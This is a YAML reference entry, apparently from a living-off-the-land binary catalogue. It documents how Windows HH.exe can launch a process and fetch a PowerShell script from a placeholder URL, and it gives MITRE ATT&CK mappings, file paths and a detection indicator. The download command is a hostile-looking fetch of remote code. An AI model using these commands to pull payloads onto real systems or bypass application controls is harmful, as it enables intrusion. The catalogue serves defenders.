---
name: Hh.exe
description: Binary used for processing chm files in Windows
functions:
  execute:
    - description: Executes calc.exe with HTML Help.
      code: HH.exe c:\windows\system32\calc.exe
      mitreid: T1216
      mitrelink: https://attack.mitre.org/wiki/Technique/T1216
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Execute process with HH.exe
  download:
    - description: Open the target PowerShell script with HTML Help.
      code: HH.exe http://some.url/script.ps1
      mitreid: T1105
      mitrelink: https://attack.mitre.org/wiki/Technique/T1105
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Download files from url
resources:
    - resource: https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/
fullpath:
    - path: C:\Windows\System32\hh.exe
    - path: C:\Windows\SysWOW64\hh.exe
detection:
  - IOC: hh.exe should normally not be in use on a normal workstation
acknowledgement:
  - Person: Oddvar Moe
    Handle: '@oddvarmoe'
---
